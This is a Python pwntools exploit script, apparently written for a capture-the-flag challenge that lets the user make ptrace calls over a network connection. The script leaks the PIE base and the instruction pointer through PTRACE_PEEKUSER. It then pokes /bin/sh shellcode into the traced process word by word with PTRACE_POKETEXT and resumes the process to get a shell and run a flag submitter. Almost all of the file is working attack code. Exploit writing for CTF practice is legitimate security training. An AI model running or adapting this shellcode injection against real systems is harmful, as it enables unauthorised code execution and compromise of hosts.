#!/usr/bin/env python3

from pwn import *
import sys

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

binary = './challenge'
brkpts = '''
set follow-fork parent
'''

#elf = ELF("./challenge")
#libc = ELF("./libc.so.6")

context.terminal = ['tmux', 'splitw', '-h']
context.arch = "amd64"
#context.log_level = "debug"
context.aslr = False

io = remote(HOST, int(PORT))
#io = gdb.debug(binary, brkpts)
#io = process(binary)

re = lambda a: io.recv(a)
reu = lambda a: io.recvuntil(a)
rl = lambda: io.recvline()
s = lambda a: io.send(a)
sl = lambda a: io.sendline(a)
sla = lambda a,b: io.sendlineafter(a,b)
sa = lambda a,b: io.sendafter(a,b)

uu64 = lambda a: u64(a.ljust(8, b"\x00"))

PTRACE_PEEKTEXT   = 1
PTRACE_PEEKDATA   = 2
PTRACE_PEEKUSER   = 3
PTRACE_POKETEXT   = 4
PTRACE_POKEDATA   = 5
PTRACE_CONT       = 7
PTRACE_SINGLESTEP = 9
PTRACE_GETREGS    = 12
PTRACE_SETREGS    = 13
PTRACE_ATTACH     = 16
PTRACE_DETACH     = 17

def ptrace(arg1, arg2, arg3):
    sla(b"?", str(arg1).encode())
    sla(b"?", str(arg2).encode())
    sla(b"?", str(arg3).encode())

ptrace(PTRACE_PEEKUSER, 8, 0)
reu("ptrace returned ")
pie_base = int(rl().strip(), 16) - 0x3d68
sla(b"?", b"1")


ptrace(PTRACE_PEEKUSER, 80, 0)
reu("ptrace returned ")
rip = int(rl().strip(), 16)
sla(b"?", b"1")

sc = asm(shellcraft.sh())
for i in range(0, len(sc), 4):
    ptrace(PTRACE_POKETEXT, hex(rip+i), hex(u32(sc[i:i+4])))
    sla(b"?", b"1")

ptrace(PTRACE_CONT, 0, 0)

time.sleep(1)
sla(b"?", b"0")

io.sendline("./submitter")
#io.recvutil(b' ')
print(io.recvline())
print(io.recvline(timeout=1))
print(io.recvline(timeout=1))
exit()
#io.interactive()
